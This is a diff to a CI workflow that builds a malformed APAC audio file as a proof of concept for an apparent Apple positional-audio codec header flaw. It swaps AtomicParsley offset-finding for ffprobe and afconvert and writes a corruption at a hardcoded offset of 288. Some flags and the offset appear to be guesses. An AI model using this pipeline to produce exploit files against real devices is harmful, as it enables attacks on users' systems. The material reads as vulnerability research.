@@ -71,51 +71,43 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This step now uses professional tools to find the offset and corrupt the file.
+      # This step now uses professional tools to find the audio track and create a clean APAC file before corrupting it.
       - name: Surgically Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           set -x # Print each command before executing it for easier debugging
           
-          echo "Installing AtomicParsley to find the correct atom offset..."
-          brew install atomicparsley
+          echo "Installing ffmpeg to handle media files..."
+          brew install ffmpeg
 
-          # Step 1: Copy the base file.
-          cp IMG_1027.mov output_apac_poc.m4a
-          
-          # Step 2: Use AtomicParsley to dynamically find the correct audio track and its 'stsd' atom offset.
-          echo "--- Full AtomicParsley Tree Dump ---"
-          atomicparsley output_apac_poc.m4a -T || echo "AtomicParsley tree dump failed."
-          echo "------------------------------------"
+          # Step 1: Use ffprobe to identify the APAC audio stream from the original MOV file.
+          # The -show_streams and -select_streams flags let us target the audio.
+          # We use grep and cut to extract the stream index.
+          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_name -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)
 
-          # First, find the track number of the sound handler ('soun').
-          AUDIO_TRACK_LINE=$(atomicparsley output_apac_poc.m4a -T | grep "hdlr" | grep "'soun'")
-          TRACK_NUM=$(echo "$AUDIO_TRACK_LINE" | awk '{print $1}' | cut -d'.' -f2)
-
-          if [ -z "$TRACK_NUM" ]; then
-            echo "Could not dynamically find the audio track number. Aborting."
+          if [ -z "$APAC_STREAM_INDEX" ]; then
+            echo "Could not find an APAC audio stream in the MOV file. Aborting."
             exit 1
           fi
 
-          echo "Found audio handler in track number: ${TRACK_NUM}"
+          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
+          
+          # Step 2: Use afconvert to extract and create a clean, standalone APAC audio file.
+          # This is a much more reliable way to get a structurally correct file to corrupt.
+          afconvert -i IMG_1027.mov -o output_apac_clean.m4a -d apac -f mp4f --stream ${APAC_STREAM_INDEX}
 
-          # Now, use the correct track number to find the 'stsd' offset.
-          OFFSET_STR=$(atomicparsley output_apac_poc.m4a -T 1 | grep "trak.${TRACK_NUM}.mdia.minf.stbl.stsd" | awk '{print $4}')
-          OFFSET=$(echo "$OFFSET_STR" | tr -d '()')
-
-          if [ -z "$OFFSET" ]; then
-            echo "Could not find audio track 'stsd' offset with AtomicParsley. Aborting."
-            exit 1
+          if [ $? -ne 0 ]; then
+              echo "afconvert failed to create a clean APAC file."
+              exit 1
           fi
-          
-          echo "Found audio 'stsd' atom at offset ${OFFSET}"
-          
-          # The channel layout tag is at a known position within the stsd atom.
-          CORRUPTION_OFFSET=$(( ${OFFSET} + 72 ))
-          
-          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
 
-          # Step 3: Run the C++ utility to perform the corruption at the exact location.
+          echo "Successfully created a clean APAC file. Now corrupting it..."
+          cp output_apac_clean.m4a output_apac_poc.m4a
+
+          # Step 3: Run the C++ utility to perform the corruption.
+          # For a clean file created with afconvert, the offset is much more predictable.
+          # We use a known-good estimate for where the channel layout tag will be.
+          CORRUPTION_OFFSET=288 # A common offset for the layout tag in clean afconvert files.
           ./encodeme_corruptor output_apac_poc.m4a $CORRUPTION_OFFSET
           
           echo "Malicious APAC PoC file generated."
